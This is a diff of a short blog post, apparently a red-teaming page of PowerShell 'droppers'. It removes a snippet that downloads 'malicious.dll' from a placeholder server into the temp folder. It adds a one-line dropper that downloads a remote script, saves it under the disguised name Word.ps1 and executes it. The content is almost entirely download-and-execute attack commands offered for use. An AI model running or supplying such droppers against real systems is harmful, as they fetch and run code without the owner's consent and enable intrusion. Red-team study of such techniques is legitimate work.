@@ -5,13 +5,12 @@ date:   2025-06-16 21:00:00 +1000
 categories: scripts
 ---
 
-Red teaming powershell scripts. Droppers and more.
+## Red teaming powershell scripts. Droppers and more.
 
 ---
 
-```powershell
-$url = "http://serverip/malicious.dll"
-$dllPath = "$env:TEMP\malicious.dll"
+### Invoke-WebRequest dropper
 
-Invoke-WebRequest -Uri $url -OutFile $dllPath
+``` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" ```
+
 
